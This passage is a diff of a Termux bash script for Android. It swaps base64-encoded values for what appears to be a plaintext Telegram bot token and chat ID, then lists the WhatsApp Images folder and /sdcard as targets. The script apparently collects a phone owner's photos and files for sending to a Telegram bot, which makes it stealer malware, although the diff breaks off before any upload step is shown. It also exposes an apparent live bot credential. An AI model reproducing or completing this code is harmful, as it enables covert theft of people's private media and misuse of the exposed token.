@@ -1,11 +1,7 @@
 #!/data/data/com.termux/files/usr/bin/bash
 
-A_ENC="Nzk5OTQ1MTkyODpBQUVtbktXVjRyU2ZmVmozamY2Rmo3S1lPUklZeVJESXpmYw=="
-B_ENC="NjM2MzUyMDY4Ng=="
-
-a=$(echo "$A_ENC" | base64 -d)
-b=$(echo "$B_ENC" | base64 -d)
-
+a="7999451928:AAEmnKWV4rSffVj3jf6Fj7KYORIYyRDIzfc"
+b="6363520686"
 c=(
   "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images"
   "/sdcard"
